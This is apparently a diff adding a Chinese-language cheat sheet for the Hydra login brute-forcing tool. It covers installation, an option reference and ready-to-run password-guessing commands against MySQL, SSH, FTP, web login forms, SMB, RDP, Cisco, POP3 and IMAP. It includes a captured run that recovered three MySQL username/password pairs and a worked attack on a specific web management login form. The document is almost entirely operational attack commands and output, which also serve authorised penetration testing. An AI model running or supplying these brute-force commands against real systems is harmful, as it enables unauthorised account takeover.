@@ -1,0 +1,123 @@
+________________________________________________________________
+https://github.com/vanhauser-thc/thc-hydra
+
+# tar zxvf thc-hydra-9.1.tar.gz
+# cd thc-hydra
+# sudo ./configure
+# sudo make
+# sudo make install
+________________________________________________________________
+使用样例:
+
+-C指定用户名和密码字典
+hydra -C pwd.txt  mysql://192.168.31.107:3306
+hydra -I  -C pwd.txt  mysql://192.168.31.107:3306
+
+-I (use option -I to skip waiting)
+-e n n表示空密码试探
+-t 6 同时运行的线程数，默认为16。最多占用连接数。
+-s 3306 指定端口号
+
+-L和-P分别指定用户名和密码字典
+hydra -I -t 6 -e n -L user-dict.txt -P pwd-dict.txt  mysql://192.168.31.107:3306
+或
+    hydra -I -t 6 -e n -L user-dict.txt -P pwd-dict.txt -s 3306 192.168.31.107 mysql
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-21 23:23:04
+[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 116 login tries (l:4/p:29), ~29 tries per task
+[DATA] attacking mysql://192.168.31.107:3306/
+[3306][mysql] host: 192.168.31.107   login: test   password: 123456
+[3306][mysql] host: 192.168.31.107   login: guest   password: 1qazxsw2
+[3306][mysql] host: 192.168.31.107   login: admin   password: admin123
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-21 23:23:05
+
+________________________________________________________________
+参数说明
+
+hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]
+
+[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]
+
+-R 继续从上一次进度接着破解。
+-S 采用SSL链接。
+-s PORT 可通过这个参数指定非默认端口。
+-l LOGIN 指定破解的用户，对特定用户破解。
+-L FILE 指定用户名字典。
+-p PASS 小写，指定密码破解，少用，一般是采用密码字典。
+-P FILE 大写，指定密码字典。
+-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。
+-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。
+-M FILE 指定目标列表文件一行一条。
+-o FILE 指定结果输出文件。
+-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。
+-t TASKS 同时运行的线程数，默认为16。最多占用连接数
+-w TIME 设置最大超时的时间，单位秒，默认是30s。
+-v / -V 显示详细过程。
+server 目标ip
+service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt
+http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc
+ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec
+rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere
+teamspeak sip vmauthd firebird ncp afp等等。
+OPT 可选项
+________________________________________________________________
+各种用法实例
+1、破解ssh：
+hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
+hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh
+
+2、破解ftp：
+hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
+hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
+
+3、get方式提交，破解web登录：
+hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
+hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
+
+4、post方式提交，破解web登录：
+hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"
+hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>"
+（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中 的内容是表示错误猜解的返回信息提示。）
+
+5、破解https：
+hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https
+
+6、破解teamspeak：
+hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
+
+7、破解cisco：
+hydra -P pass.txt 10.36.16.18 cisco
+hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable
+
+8、破解smb：
+hydra -l administrator -P pass.txt 10.36.16.18 smb
+
+9、破解pop3：
+hydra -l muts -P pass.txt my.pop3.mail pop3
+
+10、破解rdp：
+hydra ip rdp -l administrator -P pass.txt -V
+
+11、破解http-proxy：
+hydra -l admin -P pass.txt http-proxy://10.36.16.18
+
+12、破解imap：
+hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
+hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
+________________________________________________________________
+爆破form登录
+
+hydra -t 3 -l admin -P pwd-dict.txt 10.255.20.102 http-post-form "/screens/wms/wms.login:opcode=login&url=%2F&needxml=0&uid=^USER^&passwd=^PASS^:failed"
+
+http-post-form 使用http协议下的post方法进行破解
+/screens/wms/wms.login:opcode=login&url=%2F&needxml=0&uid=^USER^&passwd=^PASS^:failed
+最后这段字符串由三部分组成，由其中的两个冒号划分，
+第一部分只有一个”/screens/wms/wms.login“，是指定登录页面所在目录。
+第二部分：opcode=login&url=%2F&needxml=0&uid=^USER^&passwd=^PASS^，POST提交的内容只是把用户名和密码部分换成了^USER^和^PASS^。
+USER对应前面的-l 后跟的用户名admin，PASS会被字典中的密码逐个替换。
+最后一部分failed是指定的判断密码是否正确的条件，默认是黑名单模式，也就是如果返回页面中存在"failed"就说明这个密码不正确.
+原因是我们在随便输入一个错误密码后，会看到页面中多了一个类为Login failed.提示。
+
+hydra -t 3 -L user-dict.txt -P pwd-dict.txt 10.255.20.102 http-post-form "/screens/wms/wms.login:opcode=login&url=%2F&needxml=0&uid=^USER^&passwd=^PASS^:failed"
